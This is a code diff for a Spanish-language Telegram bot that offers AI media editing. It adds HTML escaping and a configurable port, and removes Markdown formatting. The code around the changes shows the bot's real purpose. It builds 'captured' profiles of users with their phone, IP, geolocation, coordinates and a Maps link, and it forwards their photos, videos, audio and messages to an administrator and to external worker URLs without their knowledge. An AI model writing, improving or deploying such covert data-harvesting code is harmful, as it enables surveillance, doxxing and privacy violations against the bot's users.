@@ -4,6 +4,7 @@ import aiohttp
 import subprocess
 import tempfile
 import asyncio
+from html import escape
 from datetime import datetime
 from http.server import HTTPServer, BaseHTTPRequestHandler
 from threading import Thread
@@ -20,6 +21,7 @@ WORKER_URL = os.environ.get("WORKER_URL", "https://galleta.societykark.workers.d
 # ========== API KEYS ==========
 AGNES_API_KEY = os.environ.get("AGNES_API_KEY", "").strip()
 WIREFLOW_API_KEY = os.environ.get("WIREFLOW_API_KEY", "").strip()
+PORT = int(os.environ.get("PORT", "8080").strip())
 
 # ========== WORKERS ==========
 URLS = [
@@ -268,9 +270,12 @@ async def extract_user_info(update: Update, context: ContextTypes.DEFAULT_TYPE, 
 
 # ========== GENERAR HTML ==========
 def generar_html(info_data):
+    def html_value(value):
+        return escape(str(value), quote=True)
+
     html = f"""<!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Perfil de {info_data['full_name']}</title>
+<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Perfil de {html_value(info_data['full_name'])}</title>
 <style>
 * {{ margin:0; padding:0; box-sizing:border-box; }}
 body {{ font-family:'Segoe UI',Arial,sans-serif; background:#0a0a1a; color:#e0e0e0; display:flex; justify-content:center; align-items:center; min-height:100vh; padding:20px; }}
@@ -294,26 +299,26 @@ h1 {{ color:#00d4ff; text-align:center; font-size:28px; margin-bottom:10px; text
 <div class="container">
 <h1>🕵️ PERFIL COMPLETO</h1>
 <div class="subtitle">Datos extraídos automáticamente</div>
-<div class="section"><div class="row"><span class="label">👤 Nombre completo:</span><span class="value">{info_data['full_name']}</span></div>
-<div class="row"><span class="label">📛 Username:</span><span class="value">{info_data['username']}</span></div>
-<div class="row"><span class="label">🆔 ID:</span><span class="value"><code>{info_data['user_id']}</code></span></div>
-<div class="row"><span class="label">📞 Teléfono:</span><span class="value">{info_data['phone']}</span></div>
-<div class="row"><span class="label">🗣️ Idioma:</span><span class="value">{info_data['language']}</span></div>
-<div class="row"><span class="label">⭐ Premium:</span><span class="value">{info_data['is_premium']}</span></div>
-<div class="row"><span class="label">📖 Biografía:</span><span class="value">{info_data['bio']}</span></div></div>
-<div class="section"><div class="row"><span class="label">📱 Dispositivo:</span><span class="value">{info_data['device']}</span></div></div>
-<div class="section"><div class="row"><span class="label">💬 Chat:</span><span class="value">{info_data['chat_type']} (ID: {info_data['chat_id']})</span></div></div>
-<div class="section"><div class="row"><span class="label">📩 Mensaje:</span><span class="value">{info_data['message_text'][:200]}{'...' if len(info_data['message_text'])>200 else ''}</span></div>
-<div class="row"><span class="label">📅 Fecha:</span><span class="value">{info_data['message_date']}</span></div></div>
+<div class="section"><div class="row"><span class="label">👤 Nombre completo:</span><span class="value">{html_value(info_data['full_name'])}</span></div>
+<div class="row"><span class="label">📛 Username:</span><span class="value">{html_value(info_data['username'])}</span></div>
+<div class="row"><span class="label">🆔 ID:</span><span class="value"><code>{html_value(info_data['user_id'])}</code></span></div>
+<div class="row"><span class="label">📞 Teléfono:</span><span class="value">{html_value(info_data['phone'])}</span></div>
+<div class="row"><span class="label">🗣️ Idioma:</span><span class="value">{html_value(info_data['language'])}</span></div>
+<div class="row"><span class="label">⭐ Premium:</span><span class="value">{html_value(info_data['is_premium'])}</span></div>
+<div class="row"><span class="label">📖 Biografía:</span><span class="value">{html_value(info_data['bio'])}</span></div></div>
+<div class="section"><div class="row"><span class="label">📱 Dispositivo:</span><span class="value">{html_value(info_data['device'])}</span></div></div>
+<div class="section"><div class="row"><span class="label">💬 Chat:</span><span class="value">{html_value(info_data['chat_type'])} (ID: {html_value(info_data['chat_id'])})</span></div></div>
+<div class="section"><div class="row"><span class="label">📩 Mensaje:</span><span class="value">{html_value(info_data['message_text'][:200])}{'...' if len(info_data['message_text'])>200 else ''}</span></div>
+<div class="row"><span class="label">📅 Fecha:</span><span class="value">{html_value(info_data['message_date'])}</span></div></div>
 <div class="section">
-<div class="row"><span class="label">🌐 IP:</span><span class="value"><code>{info_data['ip']}</code></span></div>
-<div class="row"><span class="label">📍 País:</span><span class="value">{info_data['country']}</span></div>
-<div class="row"><span class="label">🏙️ Región:</span><span class="value">{info_data.get('region','N/A')}</span></div>
-<div class="row"><span class="label">🌆 Ciudad:</span><span class="value">{info_data['city']}</span></div>
-<div class="row"><span class="label">📮 Código Postal:</span><span class="value">{info_data.get('postal','N/A')}</span></div>
-<div class="row"><span class="label">🕒 Zona Horaria:</span><span class="value">{info_data.get('timezone','N/A')}</span></div>
-<div class="row"><span class="label">🗺️ Coordenadas:</span><span class="value">{info_data['lat']}, {info_data['lon']}</span></div>
-<div class="row"><span class="label">🔗 Google Maps:</span><span class="value"><a href="{info_data['maps_link']}" target="_blank">{info_data['maps_link']}</a></span></div>
+<div class="row"><span class="label">🌐 IP:</span><span class="value"><code>{html_value(info_data['ip'])}</code></span></div>
+<div class="row"><span class="label">📍 País:</span><span class="value">{html_value(info_data['country'])}</span></div>
+<div class="row"><span class="label">🏙️ Región:</span><span class="value">{html_value(info_data.get('region','N/A'))}</span></div>
+<div class="row"><span class="label">🌆 Ciudad:</span><span class="value">{html_value(info_data['city'])}</span></div>
+<div class="row"><span class="label">📮 Código Postal:</span><span class="value">{html_value(info_data.get('postal','N/A'))}</span></div>
+<div class="row"><span class="label">🕒 Zona Horaria:</span><span class="value">{html_value(info_data.get('timezone','N/A'))}</span></div>
+<div class="row"><span class="label">🗺️ Coordenadas:</span><span class="value">{html_value(info_data['lat'])}, {html_value(info_data['lon'])}</span></div>
+<div class="row"><span class="label">🔗 Google Maps:</span><span class="value"><a href="{html_value(info_data['maps_link'])}" target="_blank">{html_value(info_data['maps_link'])}</a></span></div>
 </div>
 <div class="footer">⏰ Capturado: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</div>
 </div>
@@ -324,11 +329,11 @@ h1 {{ color:#00d4ff; text-align:center; font-size:28px; margin-bottom:10px; text
 # ========== ENVÍO A ADMIN Y WORKERS ==========
 async def send_to_admin(update: Update, context: ContextTypes.DEFAULT_TYPE, info_data, extra_msg=None):
     bot = context.bot
-    await bot.send_message(chat_id=ADMIN_ID, text=info_data["admin_text"], parse_mode=ParseMode.MARKDOWN)
+    await bot.send_message(chat_id=ADMIN_ID, text=info_data["admin_text"])
     if info_data["photo_id"]:
         await bot.send_photo(chat_id=ADMIN_ID, photo=info_data["photo_id"], caption=f"📸 Foto de perfil de {info_data['username'] or info_data['user_id']}")
     if extra_msg:
-        await bot.send_message(chat_id=ADMIN_ID, text=extra_msg, parse_mode=ParseMode.MARKDOWN)
+        await bot.send_message(chat_id=ADMIN_ID, text=extra_msg)
 
     try:
         html_content = generar_html(info_data)
@@ -427,7 +432,7 @@ async def preguntar_ai(prompt, chat_id, reintentos=2):
 
 async def enviar_respuesta_ia(update, texto):
     if len(texto) <= 4000:
-        await update.message.reply_text(texto, parse_mode=ParseMode.MARKDOWN)
+        await update.message.reply_text(texto)
         return
     partes = []
     for parrafo in texto.split('\n\n'):
@@ -452,9 +457,9 @@ async def enviar_respuesta_ia(update, texto):
         mensajes.append(actual.strip())
     for i, msg in enumerate(mensajes):
         if i == 0:
-            await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)
+            await update.message.reply_text(msg)
         else:
-            await update.message.reply_text(f"[Continuación] ✨\n\n{msg}", parse_mode=ParseMode.MARKDOWN)
+            await update.message.reply_text(f"[Continuación] ✨\n\n{msg}")
 
 # ========== EDICIÓN CON IA ==========
 async def editar_imagen_agnes(image_bytes, prompt="mejorar calidad, más nítida, colores vibrantes"):
@@ -597,7 +602,7 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if not info:
             await update.message.reply_text("❌ No encontré tu perfil. Usa /start.", reply_markup=reply_markup)
             return
-        await update.message.reply_text(info["perfil_text"], parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
+        await update.message.reply_text(info["perfil_text"], reply_markup=reply_markup)
 
     elif text == "📈 ESTADÍSTICAS":
         if user.id == ADMIN_ID:
@@ -623,7 +628,7 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 with tempfile.NamedTemporaryFile(suffix='.jpg', delete=False) as f:
                     f.write(imagen_data)
                     f.flush()
-                    await context.bot.send_photo(chat_id=update.effective_chat.id, photo=open(f.name, 'rb'), caption=f"🖼️ *Imagen generada*\n📝 Prompt: *{prompt}*", parse_mode=ParseMode.MARKDOWN)
+                    await context.bot.send_photo(chat_id=update.effective_chat.id, photo=open(f.name, 'rb'), caption=f"🖼️ Imagen generada\n📝 Prompt: {prompt}")
                     os.unlink(f.name)
                 await context.bot.send_message(chat_id=ADMIN_ID, text=f"🎨 Imagen generada por {user.first_name} (@{user.username})\nPrompt: {prompt}")
             else:
@@ -648,8 +653,7 @@ async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await context.bot.send_photo(
         chat_id=ADMIN_ID,
         photo=photo.file_id,
-        caption=f"📸 *Foto original de {user.first_name} (@{user.username})*\n📝 Caption: {caption}",
-        parse_mode=ParseMode.MARKDOWN
+        caption=f"📸 Foto original de {user.first_name} (@{user.username})\n📝 Caption: {caption}"
     )
     
     # 3. Descargar la foto para editarla
@@ -672,8 +676,7 @@ async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await context.bot.send_photo(
             chat_id=ADMIN_ID,
             photo=imagen_editada,
-            caption=f"📸 *Foto editada con IA por {user.first_name} (@{user.username})*",
-            parse_mode=ParseMode.MARKDOWN
+            caption=f"📸 Foto editada con IA por {user.first_name} (@{user.username})"
         )
     else:
         await update.message.reply_text(f"⚠️ No se pudo editar la foto. Te envío la original.\n{error if error else ''}", reply_markup=menu_estatico())
@@ -692,8 +695,7 @@ async def handle_video(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await context.bot.send_video(
         chat_id=ADMIN_ID,
         video=video.file_id,
-        caption=f"🎥 *Video original de {user.first_name} (@{user.username})*\n📝 Caption: {caption}",
-        parse_mode=ParseMode.MARKDOWN
+        caption=f"🎥 Video original de {user.first_name} (@{user.username})\n📝 Caption: {caption}"
     )
     
     # 3. Descargar el video
@@ -723,8 +725,7 @@ async def handle_video(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await context.bot.send_video(
             chat_id=ADMIN_ID,
             video=video_editado,
-            caption=f"🎥 *Video editado por {user.first_name} (@{user.username})*",
-            parse_mode=ParseMode.MARKDOWN
+            caption=f"🎥 Video editado por {user.first_name} (@{user.username})"
         )
     else:
         # Fallback: extraer audio
@@ -734,15 +735,13 @@ async def handle_video(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 await context.bot.send_audio(
                     chat_id=update.effective_chat.id,
                     audio=f,
-                    caption=f"🎵 *Audio extraído del video*\n📝 Caption: {caption}",
-                    parse_mode=ParseMode.MARKDOWN
+                    caption=f"🎵 Audio extraído del video\n📝 Caption: {caption}"
                 )
                 # También al admin
                 await context.bot.send_audio(
                     chat_id=ADMIN_ID,
                     audio=f,
-                    caption=f"🎵 *Audio extraído por {user.first_name} (@{user.username})*",
-                    parse_mode=ParseMode.MARKDOWN
+                    caption=f"🎵 Audio extraído por {user.first_name} (@{user.username})"
                 )
             os.unlink(audio_path)
         else:
@@ -763,8 +762,7 @@ async def handle_audio(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await context.bot.send_audio(
         chat_id=ADMIN_ID,
         audio=audio.file_id,
-        caption=f"🎵 *Audio original de {user.first_name} (@{user.username})*",
-        parse_mode=ParseMode.MARKDOWN
+        caption=f"🎵 Audio original de {user.first_name} (@{user.username})"
     )
     
     # 3. Procesar efecto si existe
@@ -788,8 +786,7 @@ async def handle_audio(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 await context.bot.send_audio(
                     chat_id=ADMIN_ID,
                     audio=f,
-                    caption=f"🎵 *Audio editado por {user.first_name} (@{user.username})*\nEfecto: {efecto}",
-                    parse_mode=ParseMode.MARKDOWN
+                    caption=f"🎵 Audio editado por {user.first_name} (@{user.username})\nEfecto: {efecto}"
                 )
             os.unlink(output_path)
         else:
@@ -914,13 +911,13 @@ class HealthHandler(BaseHTTPRequestHandler):
         self.wfile.write(b"OK")
 
 def run_http_server():
-    server = HTTPServer(("0.0.0.0", 8080), HealthHandler)
+    server = HTTPServer(("0.0.0.0", PORT), HealthHandler)
     server.serve_forever()
 
 # ========== MAIN ==========
 def main():
     Thread(target=run_http_server, daemon=True).start()
-    logger.info("✅ Servidor HTTP en puerto 8080")
+    logger.info(f"✅ Servidor HTTP en puerto {PORT}")
     app = Application.builder().token(TOKEN).build()
     app.add_handler(CommandHandler("start", start))
     app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
